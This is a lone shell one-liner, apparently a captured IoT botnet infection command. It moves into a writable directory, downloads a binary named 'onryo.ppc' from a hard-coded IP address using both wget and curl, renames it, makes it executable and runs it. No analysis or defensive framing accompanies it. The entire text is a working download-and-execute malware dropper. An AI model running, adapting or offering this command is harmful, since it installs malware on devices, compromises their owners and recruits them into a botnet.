cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://80.211.62.163/bins/onryo.ppc; curl -O http://80.211.62.163/bins/onryo.ppc;cat onryo.ppc >netis;chmod +x *;./netis ssh.wget
